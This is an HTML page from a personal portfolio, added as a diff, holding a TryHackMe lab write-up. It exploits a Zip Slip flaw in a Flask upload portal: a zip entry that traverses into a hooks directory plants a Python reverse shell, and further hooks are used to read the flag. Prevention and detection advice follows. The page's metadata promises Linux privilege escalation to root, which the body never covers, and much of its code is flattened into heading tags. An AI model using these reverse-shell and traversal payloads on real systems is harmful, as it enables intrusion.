@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Hollow Shell // writeup</title>
+    <meta name="description" content="Linux-focused walkthrough covering shell handling, filesystem enumeration and the privilege-escalation route to root on The Hollow Shell.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>The Hollow Shell</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Linux</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-06</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Linux / Privilege Escalation / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> the-hollow-shell-writeup.md</span>
+                </div>
+                <p class="writeup-summary">Linux-focused walkthrough covering shell handling, filesystem enumeration and the privilege-escalation route to root on The Hollow Shell.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/the-hollow-shell-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="the-hollow-shell-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h2>Hacker Holidays · The Byte Lotus Hotel TryHackMe Room Writeup | Web | 90 points | Difficulty: Medium Target: 10.48.147.81 (port 5000) | Technique: Zip Slip → Arbitrary File Write → RCE via theme worker hooks</h2>
+<h1>1. Room Overview &amp; Concierge Briefing</h1>
+<h2>The Byte Lotus beachfront lets guests personalise their in-room display by uploading a &quot;shell&quot; - a small .zip souvenir pack of shoreline ambiance (images, stylesheets). Staff publish them through the Shoreline Display portal. Once a shell is uploaded, a background theme worker &quot;applies automation hooks&quot; on behalf of the guest. The challenge goal is a single web flag.</h2>
+<h3>Key flavour-text hints: &quot;Slip something inside and hold it to your ear&quot; (slip a file inside the zip) and &quot;Slip past what the portal forgets to check&quot; (the portal forgets to check zip entry paths). &quot;The shell answers with a shell of your own&quot; - the goal is a reverse shell / code execution.</h3>
+<h2>2.1 Port discovery Port 80 refused the connection, so a quick bash /dev/tcp sweep was used to find open ports:</h2>
+<h3>I RECON - port discovery: find open services</h3>
+<h1>default web port refused curl -s -i http://10.48.147.81/ --max-time 20 # verbose check confirms &quot;Connection refused&quot; on 80 curl -sv http://10.48.147.81/ --max-time 20 2&gt;&amp;1 | head -50 # fast bash /dev/tcp port sweep for p in 80 443 8080 8000 8443 3000 5000 8888 9000 1337; do \ (echo &gt; /dev/tcp/10.48.147.81/$p) 2&gt;/dev/null &amp;&amp; echo &quot;OPEN: $p&quot; &amp; done; wait # OUTPUT: # OPEN: 5000</h1>
+<h3>An equivalent full-service scan from the THM AttackBox (optional, same result): nmap -Pn -sC -sV -p- 10.48.147.81</h3>
+<h2>2.2 Fingerprinting the web app</h2>
+<h3>I RECON - fingerprint the web app on :5000</h3>
+<p>curl -s -i http://10.48.147.81:5000/ --max-time 20 # HTTP/1.1 302 FOUND   Server: gunicorn # Location: /login curl -s -i http://10.48.147.81:5000/login --max-time 20</p>
+<h2>The /login page HTML contains an HTML comment that leaks the starter credentials used by IT for every property:</h2>
+<h3>I INITIAL ACCESS - leaked starter credentials in /login source</h3>
+<p>&lt;!-- Byte Lotus // internal display-manager portal New on the floor team? IT seeds every property with the same starter login until you set your own: user: concierge pass: StayNoticed2024! (rotate it from Settings on first sign-in - most people forget) --&gt;</p>
+<h1>3. Initial Access - Login</h1>
+<h2>Log in with the leaked starter credentials and keep the session cookie in a cookie jar:</h2>
+<h3>I LOGIN - authenticate with leaked credentials (cookie jar)</h3>
+<p>curl -s -i -c /tmp/opencode/cookies.txt -b /tmp/opencode/cookies.txt \ -d &quot;username=concierge&amp;password=StayNoticed2024!&quot; \ http://10.48.147.81:5000/login --max-time 20 # HTTP/1.1 302 FOUND # Location: /dashboard # Set-Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9...; HttpOnly; Path=/ curl -s -b /tmp/opencode/cookies.txt http://10.48.147.81:5000/dashboard --max-time 20</p>
+<h2>The dashboard reveals the attack surface: upload a shell (.zip souvenir pack) that must contain a shell.json manifest listing its assets (allowed types: png jpg gif svg css json). A shell may include optional automation hooks that the theme worker applies &quot;shortly after the shell comes ashore&quot;. One pre-seeded shell exists: cleanbox at shells/3103d6e2c8a5/.</h2>
+<h1>4. Application Enumeration</h1>
+<h2>Probe for hidden endpoints (all return 404 - the app only exposes /login, /dashboard, /upload and /shells/* file serving):</h2>
+<h3>I ENUM - fuzz hidden endpoints (all 404)</h3>
+<p>for p in api admin debug status worker jobs shell list \ shells upload/status flags flag health robots.txt sitemap.xml; do \ code=$(curl -s -o /dev/null -w &quot;%{http_code}&quot; -b /tmp/opencode/cookies.txt \ &quot;http://10.48.147.81:5000/$p&quot; --max-time 8); echo &quot;$p -&gt; $code&quot;; done # all -&gt; 404</p>
+<h2>Inspect the existing shell&#39;s manifest to learn the exact JSON schema:</h2>
+<h3>I ENUM - inspect pre-seeded shell manifest (learn the JSON schema)</h3>
+<p>curl -s &quot;http://10.48.147.81:5000/shells/3103d6e2c8a5/shell.json&quot; --max-time 10 # {&quot;name&quot;:&quot;cleanbox&quot;,&quot;assets&quot;:[&quot;shell.json&quot;]}</p>
+<h3>The manifest is a FLAT object: {&quot;name&quot;: &quot;&lt;name&gt;&quot;, &quot;assets&quot;: [&quot;file1.png&quot;, ...]}. Uploads using a nested {&quot;manifest&quot;: {...}} wrapper are silently ignored by the worker.</h3>
+<h1>5. Upload Testing &amp; Manifest Format Discovery</h1>
+<h2>5.1 First attempt (rejected - wrong schema)</h2>
+<h3>I UPLOAD TEST - first attempt (rejected: wrong schema)</h3>
+<p>mkdir -p /tmp/opencode/shelltest &amp;&amp; cd /tmp/opencode/shelltest cat &gt; shell.json &lt;&lt;&#39;EOF&#39; {&quot;manifest&quot;: {&quot;name&quot;: &quot;test&quot;, &quot;assets&quot;: [&quot;hello.txt&quot;]}} EOF echo &quot;beach&quot; &gt; hello.txt zip -r /tmp/opencode/test.zip shell.json hello.txt curl -s -i -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/test.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 # 302 -&gt; /dashboard but no new shell appears (hello.txt is also not an allowed asset type)</p>
+<h2>5.2 Second attempt (still rejected)</h2>
+<h3>I UPLOAD TEST - second attempt (still rejected)</h3>
+<p>cat &gt; shell.json &lt;&lt;&#39;EOF&#39; {&quot;manifest&quot;: {&quot;name&quot;: &quot;test&quot;, &quot;assets&quot;: [&quot;style.css&quot;, &quot;pic.svg&quot;]}} EOF echo &quot;body{}&quot; &gt; style.css echo &#39;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;rect width=&quot;10&quot; height=&quot;10&quot;/&gt;&lt;/svg&gt;&#39; &gt; pic.svg zip -r /tmp/opencode/test.zip shell.json style.css pic.svg curl -s -i -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/test.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 Page 2</p>
+<h2>5.3 Working upload (flat manifest)</h2>
+<h3>I UPLOAD TEST - working upload (flat manifest)</h3>
+<p>cat &gt; shell.json &lt;&lt;&#39;EOF&#39; {&quot;name&quot;:&quot;test&quot;,&quot;assets&quot;:[&quot;style.css&quot;,&quot;pic.svg&quot;]} EOF rm -f /tmp/opencode/test.zip zip -r /tmp/opencode/test.zip shell.json style.css pic.svg curl -s -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/test.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 -i | grep -E &quot;HTTP|Location&quot; # HTTP/1.1 302 FOUND  Location: /dashboard # Dashboard now shows:  test  -&gt;  shells/f715ce3d10df/</p>
+<h3>I UPLOAD TEST - verify uploaded assets are served</h3>
+<p>for f in shell.json style.css pic.svg; do \ echo &quot;== $f&quot;; curl -s -w &quot;\n%{http_code}\n&quot; \ &quot;http://10.48.147.81:5000/shells/f715ce3d10df/$f&quot; --max-time 10; done # all assets served 200 from the extracted zip</p>
+<h2>5.4 Dead ends: SSTI and manifest hook keys A Jinja2 template probe inside a CSS asset is served verbatim (no server-side templating):</h2>
+<h3>I DEAD END - SSTI probe inside a CSS asset</h3>
+<p>cat &gt; shell.json &lt;&lt;&#39;EOF&#39; {&quot;name&quot;:&quot;sstitest&quot;,&quot;assets&quot;:[&quot;style.css&quot;,&quot;pic.svg&quot;]} EOF echo &#39;body{color:red}/* {{7*7}} {{config}} <em>/&#39; &gt; style.css zip -r /tmp/opencode/sstizip.zip shell.json style.css pic.svg curl -s -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/sstizip.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 -i | grep -E &quot;HTTP|Location&quot; curl -s &quot;http://10.48.147.81:5000/shells/4dd46dd8ed2c/style.css&quot; --max-time 10 # {{7</em>7}} {{config}} returned UNRENDERED -&gt; no SSTI on served assets</p>
+<h2>Fuzzing manifest keys (&quot;hook&quot;, &quot;hooks&quot;, &quot;automation&quot;, &quot;worker&quot;) with commands and marker files inside the shell directory produces nothing - the worker never executes anything from the shell directory itself:</h2>
+<h3>I DEAD END - fuzz manifest hook keys (markers M1..M11 never fire)</h3>
+<p>cd /tmp/opencode/hooks cat &gt; shell.json &lt;&lt;&#39;EOF&#39; {&quot;name&quot;:&quot;hky&quot;,&quot;assets&quot;:[&quot;style.css&quot;], &quot;hook&quot;:&quot;run.py&quot;,&quot;hooks&quot;:[&quot;hooks.sh&quot;], &quot;automation&quot;:&quot;apply.py&quot;,&quot;worker&quot;:&quot;worker.py&quot;} EOF printf &#39;import os\nopen(&quot;M1&quot;,&quot;w&quot;).write(os.getcwd())\n&#39; &gt; run.py printf &#39;import os\nopen(&quot;M2&quot;,&quot;w&quot;).write(os.getcwd())\n&#39; &gt; apply.py printf &#39;import os\nopen(&quot;M3&quot;,&quot;w&quot;).write(os.getcwd())\n&#39; &gt; worker.py printf &#39;import os\nopen(&quot;M4&quot;,&quot;w&quot;).write(os.getcwd())\n&#39; &gt; hook.py printf &#39;import os\nopen(&quot;M5&quot;,&quot;w&quot;).write(os.getcwd())\n&#39; &gt; hooks.py printf &#39;#!/bin/sh\ntouch M6\npwd &gt; M6b\n&#39; &gt; hooks.sh printf &#39;#!/bin/sh\ntouch M7\n&#39; &gt; install.sh printf &#39;#!/bin/sh\ntouch M8\n&#39; &gt; post.sh printf &#39;#!/bin/sh\ntouch M9\n&#39; &gt; setup.sh printf &#39;{&quot;cmd&quot;:&quot;touch M10&quot;}&#39; &gt; hook.json printf &#39;{&quot;cmds&quot;:[&quot;touch M11&quot;]}&#39; &gt; hooks.json zip -r /tmp/opencode/hk.zip shell.json style.css run.py apply.py worker.py \ hook.py hooks.py hooks.sh install.sh post.sh setup.sh hook.json hooks.json curl -s -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/hk.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 -o /dev/null # after a few seconds, M1..M11 -&gt; all 404 (nothing executed)</p>
+<h3>Conclusion: the theme worker executes Python files that land in the application&#39;s own hooks/ directory (../hooks relative to the extraction dir shells/&lt;id&gt;/). To get code execution we must WRITE a .py file there - which requires an arbitrary file write. Enter: Zip Slip.</h3>
+<h1>6. The Vulnerability - Zip Slip (Arbitrary File Write)</h1>
+<h2>Zip Slip happens when an archive is extracted without validating that each entry&#39;s path stays inside the destination directory. An entry named ../../hooks/callback.py escapes shells/&lt;id&gt;/ and is written wherever the attacker wants - in this app root, which contains static/, shells/ and hooks/. The canonical proof of concept:</h2>
+<h3>I ZIP SLIP - proof-of-concept builder script</h3>
+<p>import json import zipfile manifest = {&quot;name&quot;: &quot;zipslip-proof&quot;, &quot;assets&quot;: []} with zipfile.ZipFile(&quot;zipslip-proof.zip&quot;, &quot;w&quot;) as archive: archive.writestr(&quot;shell.json&quot;, json.dumps(manifest)) archive.writestr(&quot;../../static/zipslip-proof.css&quot;, &quot;ZIP_SLIP_CONFIRMED\n&quot;) print(&quot;Created zipslip-proof.zip&quot;)</p>
+<h3>I ZIP SLIP - build, upload &amp; verify the arbitrary file write</h3>
+<p>python3 - &lt;&lt;&#39;EOF&#39; import json, zipfile manifest = {&quot;name&quot;: &quot;zipslip-proof&quot;, &quot;assets&quot;: []} with zipfile.ZipFile(&quot;zipslip-proof.zip&quot;, &quot;w&quot;) as archive: archive.writestr(&quot;shell.json&quot;, json.dumps(manifest)) archive.writestr(&quot;../../static/zipslip-proof.css&quot;, &quot;ZIP_SLIP_CONFIRMED\n&quot;) EOF unzip -l zipslip-proof.zip #   shell.json #   ../../static/zipslip-proof.css curl http://10.48.147.81:5000/static/zipslip-proof.css # ZIP_SLIP_CONFIRMED   &lt;-- arbitrary file write inside the app root</p>
+<h2>Application layout confirmed on disk (seen later from the shell): app root /var/www/conch with app.py, theme_worker.py, hooks/, shells/, static/, templates/, venv/. The worker runs files dropped into hooks/.</h2>
+<h1>7. Exploitation - Reverse Shell Through the Worker</h1>
+<h2>7.1 Build the malicious shell (zip)</h2>
+<h3>I EXPLOIT - build the malicious shell (reverse-shell zip)</h3>
+<p>mkdir -p /tmp/opencode/rev &amp;&amp; cd /tmp/opencode/rev cat &gt; build.py &lt;&lt;&#39;EOF&#39; import json, zipfile LHOST = &quot;192.168.155.203&quot;   # attacker machine (this box) LPORT = 4444 manifest = {&quot;name&quot;: &quot;shoreline-update&quot;, &quot;assets&quot;: []} callback = f&#39;&#39;&#39; import os, pty, socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(({LHOST!r}, {LPORT})) for descriptor in (0, 1, 2): os.dup2(sock.fileno(), descriptor) pty.spawn(&quot;/bin/bash&quot;) &#39;&#39;&#39; with zipfile.ZipFile(&quot;reverse-shell.zip&quot;, &quot;w&quot;) as archive: archive.writestr(&quot;shell.json&quot;, json.dumps(manifest)) archive.writestr(&quot;../../hooks/callback.py&quot;, callback) print(&quot;created&quot;) EOF python3 build.py unzip -l reverse-shell.zip # Archive:  reverse-shell.zip #   shell.json #   ../../hooks/callback.py</p>
+<h2>7.2 Start the listener and fire</h2>
+<h3>I EXPLOIT - start listener and upload the poisoned shell</h3>
+<h1>terminal 1: listen for the reverse shell nc -lvnp 4444 # (in automation it was backgrounded instead:) # (nc -lvnp 4444 &gt; /tmp/opencode/nc_out.txt 2&gt;&amp;1 &amp;) ; sleep 1 # terminal 2: upload the poisoned shell curl -s -b /tmp/opencode/cookies.txt \ -F &quot;shell=@/tmp/opencode/rev/reverse-shell.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 -i | grep -E &quot;HTTP|Location&quot; # HTTP/1.1 302 FOUND Location: /dashboard</h1>
+<h2>A few seconds later the theme worker imports/executes hooks/callback.py and the reverse shell connects:</h2>
+<h3>I EXPLOIT - worker executes the hook: shell connected</h3>
+<h1>nc -lvnp 4444 # Listening on 0.0.0.0 4444 # Connection received on 10.48.147.81 57872 # roomservice@tryhackme-2404:/var/www/conch$</h1>
+<h3>We now have code execution as roomservice (uid=996) in the app directory /var/www/conch - the &quot;shell answers with a shell of your own&quot;.</h3>
+<h1>8. Post-Exploitation &amp; Flag Retrieval</h1>
+<h2>Because hook output is discarded, a one-shot exfil hook writes command output into the web-served static/ directory, then we fetch it over HTTP:</h2>
+<h3>I FLAG HUNT - one-shot exfil hook (build script)</h3>
+<p>cd /tmp/opencode/rev cat &gt; build2.py &lt;&lt;&#39;EOF&#39; import json, zipfile manifest = {&quot;name&quot;: &quot;exfil&quot;, &quot;assets&quot;: []} code = r&#39;&#39;&#39; import subprocess r = subprocess.run([&#39;bash&#39;,&#39;-c&#39;, &#39;id; pwd; ls -la /; ls -la /var/www/conch; &#39; &#39;find / -iname &quot;*flag*&quot; -not -path &quot;/proc/*&quot; &#39; &#39;-not -path &quot;/sys/*&quot; 2&gt;/dev/null&#39;], capture_output=True, text=True) try: open(&#39;/var/www/conch/static/hookout.txt&#39;,&#39;w&#39;).write(&#39;STDOUT:\n&#39;+r.stdout+&#39;\nSTDERR:\n&#39;+r.stderr) except Exception as e: open(&#39;/tmp/hookout.txt&#39;,&#39;w&#39;).write(repr(e)) &#39;&#39;&#39; with zipfile.ZipFile(&quot;exfil.zip&quot;, &quot;w&quot;) as archive: archive.writestr(&quot;shell.json&quot;, json.dumps(manifest)) archive.writestr(&quot;../../hooks/exfil.py&quot;, code) print(&quot;created&quot;) EOF python3 build2.py</p>
+<h3>I FLAG HUNT - upload exfil hook &amp; read its HTTP output</h3>
+<p>curl -s -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/rev/exfil.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 -o /dev/null -w &quot;%{http_code}\n&quot; # 302 sleep 15 curl -s &quot;http://10.48.147.81:5000/static/hookout.txt&quot; --max-time 10</p>
+<h2>Key findings from the exfil output:</h2>
+<h3>I FLAG HUNT - exfil output: key findings</h3>
+<p>uid=996(roomservice) gid=996(roomservice) /var/www/conch # app root: app.py, theme_worker.py, hooks/, shells/, static/, templates/, venv/ # -&gt; /home/roomservice/flag.txt        &lt;-- the flag file</p>
+<h2>8.1 Read the flag</h2>
+<h3>I FLAG - grab the flag (build script)</h3>
+<p>cat &gt; build3.py &lt;&lt;&#39;EOF&#39; import json, zipfile manifest = {&quot;name&quot;: &quot;exfil2&quot;, &quot;assets&quot;: []} code = &quot;open(&#39;/var/www/conch/static/flagout.txt&#39;,&#39;w&#39;).write(open(&#39;/home/roomservice/flag.txt&#39;).read())&quot; with zipfile.ZipFile(&quot;exfil2.zip&quot;, &quot;w&quot;) as archive: archive.writestr(&quot;shell.json&quot;, json.dumps(manifest)) archive.writestr(&quot;../../hooks/exfil2.py&quot;, code) print(&quot;created&quot;) EOF python3 build3.py</p>
+<h3>I FLAG - upload flag hook &amp; read the flag</h3>
+<p>curl -s -b /tmp/opencode/cookies.txt -F &quot;shell=@/tmp/opencode/rev/exfil2.zip&quot; \ http://10.48.147.81:5000/upload --max-time 30 -o /dev/null -w &quot;%{http_code}\n&quot; sleep 15 curl -s &quot;http://10.48.147.81:5000/static/flagout.txt&quot; --max-time 10</p>
+<h1>THM{z1p_sl1pp3d_1nt0_a_sh3ll}</h1>
+<h3>Flag format check: <em><strong>{</strong></em>_*****<strong>_</strong>**_*_*****} - THM{z1p_sl1pp3d_1nt0_a_sh3ll} matches.</h3>
+<h1>9. Root Cause &amp; How to Prevent This Vulnerability</h1>
+<h2>9.1 Never extract archives with unsanitised paths (Zip Slip) Validate every archive entry BEFORE writing: reject absolute paths, drive letters, backslashes, URL-encoded or null bytes, symlink entries, and any path resolving outside the destination. Safe extraction in Python:</h2>
+<h3>I PREVENTION - safe extraction implementation</h3>
+<p>import os import zipfile ALLOWED_EXT = {&quot;png&quot;, &quot;jpg&quot;, &quot;gif&quot;, &quot;svg&quot;, &quot;css&quot;, &quot;json&quot;} def safe_extract(zip_path, dest_dir): dest = os.path.realpath(dest_dir) with zipfile.ZipFile(zip_path) as zf: for member in zf.infolist(): name = member.filename if name.startswith((&quot;/&quot;, &quot;\\&quot;)) or &quot;\\&quot; in name or &quot;..&quot; in name.split(&quot;/&quot;): raise ValueError(f&quot;unsafe entry path: {name}&quot;) target = os.path.realpath(os.path.join(dest, name)) if os.path.commonpath([dest, target]) != dest: raise ValueError(f&quot;entry escapes destination: {name}&quot;) ext = name.rsplit(&quot;.&quot;, 1)[-1].lower() if &quot;.&quot; in name else &quot;&quot; if ext not in ALLOWED_EXT and name != &quot;shell.json&quot;: raise ValueError(f&quot;disallowed asset type: {name}&quot;) if member.is_dir(): os.makedirs(target, exist_ok=True) continue with zf.open(member) as src, open(target, &quot;wb&quot;) as dst: dst.write(src.read())</p>
+<h2>9.2 Never execute uploaded / user-influenced content The theme worker importing and executing Python files from hooks/ turned a file-write bug into instant RCE. A worker should never execute files whose content or location is attacker-influenced. If &quot;automation hooks&quot; are truly needed: store them in a database as data, apply a strict schema allowlist, and run them in a sandbox (container / nsjail / seccomp) with no network egress. 9.3 Least privilege for the worker Run the web app and the worker as an unprivileged, dedicated service account (no sudo, no setuid, no world-writable dirs in the app path). Restrict the worker&#39;s network egress so a compromised hook cannot dial back to an attacker (here, the reverse shell to 192.168.155.203:4444 succeeded). 9.4 Strict manifest validation Parse shell.json against a strict JSON schema: name must be a short, printable string; assets must be an array of plain filenames with no path separators and an extension from the allowlist; unknown keys (hook, hooks, automation, ...) must be rejected outright. 9.5 Storage hygiene Write extracted files under a random, server-generated directory name and never let zip entry names influence the destination. Serve only through a whitelisted static handler with Content-Disposition: attachment for non-rendered types. 9.6 Secrets and credentials Do not ship default credentials, and never embed them in HTML comments. Enforce a forced password rotation for the starter account and remove unused accounts. (Here the credentials concierge / StayNoticed2024! were the entire initial access.) 9.7 Detectability Alert on: new/modified files inside the application root (file integrity monitoring on hooks/ and static/), outbound connections from the web/worker service, and uploads whose zip entries contain traversal sequences. Add zipslip-proof.css / callback.py-style markers to detection test suites.</h2>
+<h1>10. Attack Timeline &amp; Cheat Sheet</h1>
+<h3>I CHEAT SHEET - attack timeline</h3>
+<pre class="code-block" data-lang="bash"><code>[1] Recon            bash /dev/tcp sweep        -&gt; port 5000 open (gunicorn/Flask)
+[2] Source check     /login HTML comment         -&gt; concierge / StayNoticed2024!
+[3] Login            POST /login + cookie jar    -&gt; session cookie
+[4] Enumeration      endpoint fuzzing (all 404)  -&gt; /login /dashboard /upload /shells/*
+[5] Upload testing   manifest schema discovery   -&gt; {&quot;name&quot;:..,&quot;assets&quot;:[..]} flat JSON
+[6] Dead ends        SSTI probe, hook keys       -&gt; nothing executed from shell dir
+[7] Vulnerability    Zip Slip ../../ traversal   -&gt; arbitrary file write in app root
+[8] Exploitation     write ../../hooks/callback.py -&gt; worker executes it -&gt; reverse shell
+[9] Flag             exfil hook -&gt; /var/www/conch/static/ -&gt; THM{z1p_sl1pp3d_1nt0_a_sh3ll}</code></pre>
+<h2>Flag: THM{z1p_sl1pp3d_1nt0_a_sh3ll} - the beach shell was hollow, but it carried a very different shell inside.</h2>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/the-hollow-shell-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="the-hollow-shell-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
